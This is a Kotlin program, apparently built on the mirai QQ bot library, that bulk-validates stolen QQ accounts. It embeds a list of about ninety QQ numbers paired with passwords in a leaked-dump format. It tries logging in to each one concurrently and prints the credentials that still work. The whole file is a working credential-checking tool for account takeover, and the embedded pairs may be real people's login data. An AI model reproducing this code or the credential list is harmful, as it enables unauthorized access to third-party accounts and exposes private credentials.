import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import net.mamoe.mirai.Robot
import net.mamoe.mirai.network.packet.login.LoginState
import net.mamoe.mirai.utils.RobotAccount
import java.util.*

/**
 * @author Him188moe
 */

val qqList = "2258868346----123456789.\n" +
        "1545483785----yuk7k1dxnf3jn5\n" +
        "2948786488----123123123\n" +
        "3059674084----qq123456\n" +
        "1918079979----123456789.\n" +
        "3050478794----18872590321\n" +
        "3331537204----123456789.\n" +
        "2128659972----123456789.\n" +
        "3435376516----abc123456\n" +
        "2980527804----a123456\n" +
        "2752195782----qq123456789\n" +
        "3130257966----13415986622\n" +
        "1802730396----123456789\n" +
        "3021732783----15866103923\n" +
        "306499606----abc123456\n" +
        "2893904328----abc123456\n" +
        "1765904806----123456789\n" +
        "3254202261----15223045268\n" +
        "2947707697----abc123456\n" +
        "3500959200----123456789.\n" +
        "2169513531----123456789.\n" +
        "2983688661----a123456\n" +
        "1246882194----pz49779866\n" +
        "2315275635----147258369\n" +
        "2802294904----123456789\n" +
        "2955364492----1234567890\n" +
        "1753325115----123456789\n" +
        "2642725191----qq123456\n" +
        "2152972686----123456789.\n" +
        "2845953617----123456789.\n" +
        "3329641753----123456789.\n" +
        "1458302685----123456789a\n" +
        "2351156352----987654321\n" +
        "2304786984----fkhwt53787\n" +
        "3322756212----123456789.\n" +
        "3187253283----123456789.\n" +
        "3168715730----147258369\n" +
        "2189916732----18831892323\n" +
        "2965337631----123456789.\n" +
        "1901802165----123456789.\n" +
        "414015319----abc123456\n" +
        "3400636089----123456789a\n" +
        "3530336304----seoua80060\n" +
        "3147312971----123456789.\n" +
        "3011083526----yp70y9\n" +
        "286888078----abc123456\n" +
        "3126754112----1234567890\n" +
        "2924643025----123123123\n" +
        "341870356----ncvhZtQD\n" +
        "3358177328----123456789a\n" +
        "1396419201----eakuj14475\n" +
        "3541159580----123456789.\n" +
        "2540245592----1234567890\n" +
        "2024802855----123456789.\n" +
        "2578309660----1234567890\n" +
        "1934965091----123456789.\n" +
        "3449408956----a123456789\n" +
        "2509348670----123456789.\n" +
        "2305961679----123456789.\n" +
        "3532858521----123456789.\n" +
        "3308276898----123456789a\n" +
        "1760897490----123456789\n" +
        "2920800012----123123123\n" +
        "2923942248----123123123\n" +
        "3216600579----13882755274\n" +
        "3100259299----qq123456\n" +
        "3242723735----1234567890\n" +
        "2142733062----123456789.\n" +
        "1557689693----123456789\n" +
        "3505693439----sb2662vqy6q\n" +
        "3231125974----123456789.\n" +
        "3433048975----13893690883\n" +
        "3168017129----18780999209\n" +
        "2922045831----123123123\n" +
        "3578152022----a123456789\n" +
        "2116254935----147258369\n" +
        "3158479284----1234567890\n" +
        "3149394424----qq123456789\n" +
        "2829521712----123456789.\n" +
        "3218671461----123456789.\n" +
        "3035873094----123456789a\n" +
        "2224518667----147258369\n" +
        "3175801590----123456789.\n" +
        "3203228181----123456789a\n" +
        "3213497536----123456789a\n" +
        "3377317115----123456789\n" +
        "2672537341----qq123456789\n" +
        "2945957617----123123123\n" +
        "2763390197----123456789.\n" +
        "3322711709----123456789."


fun main() {
    val goodRobotList = Collections.synchronizedList(mutableListOf<Robot>())

    qqList.split("\n").forEach {
        GlobalScope.launch {
            val strings = it.split("----")
            Robot(RobotAccount(strings[0].toLong(), strings[1].let { password ->
                if (password.endsWith(".")) {
                    return@let password.substring(0, password.length - 1)
                }
                return@let password
            }), listOf()).network.tryLogin { state ->
                if (!(state == LoginState.BLOCKED || state == LoginState.DEVICE_LOCK || state == LoginState.WRONG_PASSWORD)) {
                    goodRobotList.add(this)
                }
            }
        }
    }

    Thread.sleep(9 * 3000)

    println(goodRobotList.joinToString("\n") { it.account.qqNumber.toString() + "    " + it.account.password })
}

